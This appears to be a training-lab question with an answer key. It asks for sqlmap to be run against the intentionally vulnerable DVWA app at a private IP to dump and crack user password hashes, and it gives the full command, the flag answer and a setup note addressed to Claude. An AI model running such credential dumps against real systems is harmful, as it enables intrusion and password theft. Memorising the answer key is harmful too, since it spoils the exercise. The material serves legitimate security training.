# Q266 — Extract and Crack Hashes via SQLMap

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Use sqlmap to dump DVWA password hashes and let sqlmap auto-crack them. Report cracked passwords."

---

## 🎯 Flag Format

```
admin_pass=<password>; total_cracked=<number>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" -D dvwa -T users -C user,password --dump --batch
```

**Answer:** `admin_pass=password; total_cracked=5`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q266"
